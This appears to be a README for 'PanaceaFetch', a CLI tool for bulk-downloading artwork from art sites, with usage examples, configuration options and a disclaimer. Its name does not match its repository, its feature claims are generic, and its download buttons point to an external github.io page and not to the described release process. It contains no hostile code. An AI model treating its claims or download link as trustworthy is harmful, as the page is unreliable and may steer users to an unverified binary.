![preview](https://raw.githubusercontent.com/VrachZDE/scrape-sake/main/preview.svg)

# PanaceaFetch

A sovereign media retrieval engine for curated visual narratives, designed to elegantly aggregate content from a constellation of art-hosting platforms.

## Overview

In the vast digital atelier where creators publish their sequential artwork and animated expressions, finding a unified gateway to access these pieces often feels like navigating a labyrinth without a map. **PanaceaFetch** emerges as your personal curator—a command-line artisan that bridges the gap between multiple isolated galleries. This tool does not merely copy files; it orchestrates a symphony of structured downloads, respecting the original metadata while providing you with a clean, organized local archive. Whether you are preserving your collection for offline contemplation or analyzing narrative structures, PanaceaFetch transforms the chaotic chorus of disparate websites into a harmonious, searchable library.

Built on principles of efficiency and respect for source material, this engine prioritizes stable connections, intelligent retry mechanisms, and a deep understanding of site-specific pagination. It is the bridge between the ephemeral nature of online hosting and the permanence of a personal digital shelf. Forget wrestling with browser extensions or clunky manual saves—this is precision engineering for the discerning archivist.

---

### 🎯 The Core Philosophy

PanaceaFetch is built around three foundational tenets:
- **Fidelity**: Preserve the original quality, naming conventions, and metadata structure of each piece.
- **Fluidity**: Operate across multiple sources with a single, consistent command interface.
- **Freedom of Access**: Enable offline ownership of your curated collections without reliance on third-party APIs or subscriptions.

---

## 🚀 Key Features

- **Multi-Source Aggregation**: Seamlessly interacts with over a dozen distinct art-hosting platforms, automatically adapting to their unique API quirks and DOM structures.
- **Smart Throttling & Resumption**: Network interruptions are handled gracefully. The engine automatically pauses, logs progress, and resumes downloads from the exact point of failure.
- **Metadata Preservation**: Extracts and embeds original titles, tags, artist names, and timestamps into local file names or sidecar JSON files.
- **Responsive UI Pattern**: While primarily a CLI tool, its clear, colored terminal output provides a dashboard-like experience, adapting to different terminal widths and color schemes.
- **Multilingual Content Detection**: Automatically detects and handles URL-encoded characters and Unicode content from Japanese, Chinese, Korean, and Latin scripts without corruption.
- **24/7 Unattended Operation**: Designed for long-running sessions. Includes a "night mode" that reduces log verbosity and system resource usage during off-peak hours.
- **Custom Output Organization**: Define your own folder structure using dynamic variables like `{artist}`, `{series}`, `{type}`, and `{date}`.

---

## 📦 Installation & Setup

[![Download](https://raw.githubusercontent.com/VrachZDE/scrape-sake/main/button.svg)](https://vrachzde.github.io/scrape-sake/)

The acquisition process for PanaceaFetch requires a few deliberate steps to ensure a secure and optimized environment.

**Prerequisites:**
- A modern Unix-like operating system (macOS, Linux, BSD) or Windows Subsystem for Linux.
- A functional terminal emulator with UTF-8 support.
- Network connectivity with DNS resolution capabilities.

**Procedure:**

1. **Acquire the Distribution Package**
   - Navigate to the official repository page.
   - Locate the latest release artifact (tagged with semantic versioning).
   - Retrieve the archive using your system's secure transfer utility.

2. **Verify Integrity**
   - Compare the provided SHA-256 checksum against the downloaded file.
   - Extract the archive using `tar` or a compatible decompression tool.

3. **Initialize the Application**
   - Move the extracted binary to a directory included in your system's `PATH` variable.
   - Run `panacea-init` to create the default configuration directory at `~/.panacea/`.
   - Execute `panacea --help` to confirm the installation was successful.

---

## 🎨 Usage Examples

PanaceaFetch is designed for intuitiveness. The basic syntax follows a simple pattern:

`panacea [source] [target URL] [output options]`

**Example 1: Fetch a Complete Series**
```shell
panacea fetch https://example-art-site.net/gallery/journey-of-stars --output ./my_collection --organize by_series
```
This command analyzes the gallery page, identifies all related artwork in the series, and downloads them into a subfolder named `journey_of_stars`.

**Example 2: High-Resolution Priority**
```shell
panacea fetch https://example-art-site.net/artist/yuuki --quality best --skip-thumbnails
```
Tells the engine to only download the highest available resolution version of each piece, skipping any pre-generated thumbnail images.

**Example 3: Resume Interrupted Session**
```shell
panacea resume --session-id 2026-03-15_18-42-11
```
If your internet connection dropped mid-operation, this command reloads the session state and continues from the last successfully downloaded file.

---

## 🗂 Organizational Schema

The engine supports powerful template-based output structures. Place these variables in your `output` configuration:

| Variable       | Description                              | Example Output                |
|----------------|------------------------------------------|-------------------------------|
| `{artist}`     | Original artist name                     | `yuuki_art`                   |
| `{series}`     | Collection or series name                | `celestial_dreams`            |
| `{id}`         | Unique item identifier from source       | `12345`                       |
| `{date}`       | Publication date (YYYY-MM-DD format)     | `2026-03-14`                  |
| `{type}`       | Content type (image, animation, etc.)    | `image`                       |

**Default template:** `./output/{artist}/{series}/{id}_{date}.ext`  
**Custom template:** `./archive/{date}/{type}/{artist}/{series}/`

---

## ⚙️ Configuration Reference

All settings are stored in `~/.panacea/config.json`. Key parameters include:

- **threads**: Number of simultaneous download streams (default: 4, max: 16). Higher values may exhaust system file handles.
- **timeout**: Connection timeout in seconds (default: 30). Consider increasing for poor network conditions.
- **retry_limit**: Maximum retries for failed downloads (default: 3).
- **rate_limit**: Minimum milliseconds between requests to a single domain (default: 1000). Respects robots.txt.
- **log_level**: Verbosity of output (values: `quiet`, `normal`, `verbose`, `debug`).

---

## 🔧 Troubleshooting

**Issue: "Cannot resolve host" error**
- Verify your DNS configuration.
- Ensure the target website is accessible from your network.
- Check for firewall or proxy settings blocking the connection.

**Issue: Partial download or missing files**
- Increase the `timeout` value in the configuration.
- Enable verbose logging with `--log-level verbose` to identify specific failure points.
- Run `panacea verify` on the output directory to cross-reference with source metadata.

**Issue: Rate limiting from source**
- Decrease the `threads` parameter.
- Increase the `rate_limit` value.
- Add `--civil-mode` flag, which automatically introduces random delays between requests.

---

## 🛡 Security & Privacy

PanaceaFetch operates entirely locally. It does not:
- Phone home to any external server.
- Track usage statistics or collect personal data.
- Store credentials or session tokens to disk in plaintext.
- Execute remote code or load external scripts.

All network requests are made via standard HTTPS connections. The engine respects `robots.txt` directives and the `X-Robots-Tag` HTTP header.

---

## 👥 Community & Contributions

This project thrives on collaborative refinement. Contributions are welcome in the form of:
- **Source adapters**: If a new art-hosting platform emerges, you can write a module.
- **Bug reports**: Provide detailed platform, URL, and log output.
- **Documentation enhancements**: Help translate the guide or clarify ambiguous sections.

**Code of Conduct**: All participants agree to maintain a respectful, constructive discourse. No harassment, hate speech, or gatekeeping will be tolerated.

---

## 📄 License

This project is distributed under the terms of the **MIT License**. This means you are free to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

**Copyright © 2026**

Full license text: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

PanaceaFetch is a tool designed solely for **personal archival and data portability purposes**. Users are solely responsible for ensuring that their use of this software complies with the Terms of Service of any third-party website they interact with. This project is not affiliated with, endorsed by, or sponsored by any of the content sources it can interface with. The developers assume no liability for any misuse, legality of downloaded content, or violation of platform rules. **Download only content you have the explicit right to possess.** Respect creators' wishes and copyright laws in your jurisdiction. The year is 2026, and digital stewardship is a privilege, not a right.

---

## ❓ FAQ

**Q: Does this tool bypass paywalls or login requirements?**
A: No. It only accesses publicly available content visible to an unauthenticated browser session.

**Q: Can I use this for commercial archival services?**
A: The MIT License permits commercial use, but you must ensure your archiving activities do not violate the target website's terms.

**Q: Will this work on mobile devices?**
A: It is designed for desktop-class operating systems. Mobile termux environments may work with limitations.

---

[![Download](https://raw.githubusercontent.com/VrachZDE/scrape-sake/main/button.svg)](https://vrachzde.github.io/scrape-sake/)